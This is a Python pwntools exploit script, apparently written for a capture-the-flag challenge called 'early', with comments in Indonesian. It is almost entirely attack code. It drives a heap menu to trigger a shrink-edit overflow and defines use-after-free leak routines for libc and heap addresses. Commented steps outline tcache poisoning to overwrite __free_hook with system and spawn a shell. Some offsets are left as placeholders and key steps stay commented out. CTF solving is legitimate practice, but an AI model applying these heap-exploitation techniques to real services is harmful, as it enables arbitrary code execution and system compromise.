from pwn import *
context.binary = ELF('./early', checksec=False)
context.log_level = 'info'

def start_local():
    return remote('127.0.0.1', 9103)

def start_remote():
    # catat: endpoint SSL
    return remote('early.cbc2025.cloud', 443, ssl=True, sni='early.cbc2025.cloud')

def add(p, sz, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size?', str(sz).encode())
    p.sendafter(b':', data if len(data)==sz else data.ljust(sz, b'\x00'))

def edit(p, idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index?', str(idx).encode())
    # program minta "exact length", jadi JANGAN pakai sendline
    p.send(data)

def prnt(p, idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index?', str(idx).encode())
    return p.recvuntil(b'\n== menu ==', drop=True)  # heuristic; sesuaikan kalau perlu

def resize(p, idx, new_sz):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index?', str(idx).encode())
    p.sendlineafter(b'new size?', str(new_sz).encode())
    p.recvuntil(b'resized')

def delete(p, idx):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'index?', str(idx).encode())

def leak_uaf_unsorted(p):
    # contoh pola leak libc via unsorted
    add(p, 0x430, b'A'*0x430)        # idx0
    add(p, 0x20,  b'/bin/sh\x00'.ljust(0x20, b'\x00'))  # idx1 helper
    delete(p, 0)                     # idx0 -> unsorted
    leak = prnt(p, 0)                # UAF read
    # Ambil 8 byte pointer dari awal chunk; sesuaikan offset sesuai output nyata
    import re, struct
    # Cari kandidat pointer 0x7f.. pola libc
    cands = re.findall(rb'[\x00-\xff]{8}', leak)
    libc_leak = None
    for c in cands:
        x = struct.unpack('<Q', c)[0]
        if (x >> 40) & 0xff in (0x7f,):  # heuristic: high bytes 0x7f untuk x86_64 libc
            libc_leak = x
            break
    if not libc_leak:
        log.failure('gagal deteksi libc leak otomatis'); pause()
    log.success(f'libc ptr ~ {hex(libc_leak)}')
    return libc_leak

def leak_heap_via_tcache(p):
    add(p, 0x90, b'H'*0x90)   # idx2
    delete(p, 2)              # ke tcache, hanya 1 entry
    leak = prnt(p, 2)         # UAF read tcache entry
    import struct
    # baca 8 byte pertama sebagai fd ^ (heap>>12)
    fd_enc = struct.unpack('<Q', leak[:8].ljust(8, b'\x00'))[0]
    heap_shr12 = fd_enc       # karena next=NULL
    heap_base = heap_shr12 << 12
    log.success(f'heap_base ~ {hex(heap_base)}')
    return heap_base

def main():
    # p = start_local()
    p = start_remote()

    # --- pilih jalur sesuai hasil test ---
    # 1) Konfirmasi overflow shrink-edit:
    add(p, 0x60, b'A'*0x60)  # idx0
    add(p, 0x60, b'B'*0x60)  # idx1
    resize(p, 0, 0x10)
    # kirim tepat 0x60 agar overflow
    edit(p, 0, b'C'*0x60)
    data = prnt(p, 1)
    log.info(f'peek idx1: {data[:80]}')
    # Kalau idx1 korup -> overflow OK

    # 2) Leak libc (butuh UAF true). Kalau tidak UAF, skip dan gunakan overlap path.
    # libc_leak = leak_uaf_unsorted(p)
    # heap_base = leak_heap_via_tcache(p)
    #
    # Hitung libc_base dari libc_leak (main_arena) -> cari offset pakai libc dari target (Ubuntu 24.04).
    # libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    # libc.address = libc_leak - OFFSET_MAIN_ARENA_X
    # free_hook = libc.sym['__free_hook']
    # system = libc.sym['system']
    #
    # 3) tcache poisoning → allocate to __free_hook:
    # ... tulis (free_hook ^ (heap>>12)) ke fd ...
    # ... allocate 2x, landing on __free_hook, write system ...
    # ... allocate chunk berisi b'/bin/sh\x00' dan free ...

    p.interactive()

if __name__ == '__main__':
    main()
